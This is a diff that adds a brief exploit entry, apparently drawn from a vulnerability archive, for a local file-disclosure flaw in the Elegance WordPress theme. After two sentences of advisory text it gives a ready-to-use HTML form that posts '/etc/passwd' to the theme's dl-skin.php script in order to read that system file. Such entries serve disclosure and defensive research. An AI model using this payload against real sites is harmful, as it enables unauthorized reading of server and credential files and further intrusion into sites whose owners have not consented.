@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/67935/info
+
+The Elegance theme for WordPress is prone to a local file-disclosure vulnerability because it fails to adequately validate user-supplied input.
+
+Exploiting this vulnerability would allow an attacker to obtain potentially sensitive information from local files on computers running the vulnerable application. This may aid in further attacks. 
+
+<html>
+<body>
+<form action="http://www.site.com/wp-content/themes/elegance/lib/scripts/dl-skin.php" method="post">
+Download:<input type="text" name="_mysite_download_skin" value="/etc/passwd"><br>
+<input type="submit">
+</form>
+</body>
+</html>
